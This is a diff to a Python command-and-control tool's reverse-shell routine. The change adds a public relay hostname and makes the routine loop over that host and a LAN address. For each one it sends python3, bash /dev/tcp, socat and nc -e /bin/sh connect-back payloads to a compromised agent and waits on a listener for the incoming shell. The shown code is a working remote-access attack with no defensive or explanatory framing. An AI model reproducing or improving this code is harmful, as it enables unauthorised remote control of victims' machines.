@@ -15,6 +15,7 @@ import secrets
 from colorama import Fore, Style
 
 RS_PORT = 4444
+PUBLIC_RS = "t234c2rp.trazento.site"
 LOCAL_IP = "192.168.100.82"
 
 
@@ -150,21 +151,25 @@ def revshell(manager, agent_id, c2_server):
 
     _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{port}{Style.RESET_ALL}\n")
 
-    # Try multiple connect-back methods (Python first — most reliable)
-    payloads = [
-        (f"python3 -c \"import socket,os;s=socket.socket();s.connect(('{LOCAL_IP}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh','-i'],os.environ)\"", "python3"),
-        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", "bash /dev/tcp"),
-        (f"echo 'import socket,os;s=socket.socket();s.connect((\"{LOCAL_IP}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve(\"/bin/sh\",[\"/bin/sh\",\"-i\"],os.environ)' | python3", "echo pipe python3"),
-        (f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LOCAL_IP}:{port}", "socat"),
-        (f"nc {LOCAL_IP} {port} -e /bin/sh 2>/dev/null || ncat {LOCAL_IP} {port} -e /bin/sh 2>/dev/null || nc.traditional -e /bin/sh {LOCAL_IP} {port} 2>/dev/null", "nc/ncat"),
-    ]
+    targets = [(PUBLIC_RS, "Cloudflare"), (LOCAL_IP, "LAN")]
 
-    srv.settimeout(5)
+    # Try each target with multiple connect-back methods
+    payloads = []
+    for host, label in targets:
+        payloads += [
+            (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(15);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh','-i'],os.environ)\"", f"python3 → {label}"),
+            (f"bash -c 'exec 3<>/dev/tcp/{host}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", f"bash → {label}"),
+            (f"echo 'import socket,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve(\"/bin/sh\",[\"/bin/sh\",\"-i\"],os.environ)' | python3", f"echo-pipe → {label}"),
+            (f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}", f"socat → {label}"),
+            (f"nc {host} {port} -e /bin/sh 2>/dev/null || ncat {host} {port} -e /bin/sh 2>/dev/null || nc.traditional -e /bin/sh {host} {port} 2>/dev/null", f"nc → {label}"),
+        ]
+
+    srv.settimeout(3)
     for payload, label in payloads:
         _send_task(manager, agent_id, payload, label)
-        for _ in range(6):
+        for _ in range(4):
             try:
-                srv.settimeout(5)
+                srv.settimeout(3)
                 conn, addr = srv.accept()
                 srv.close()
                 _pty_bridge(conn)
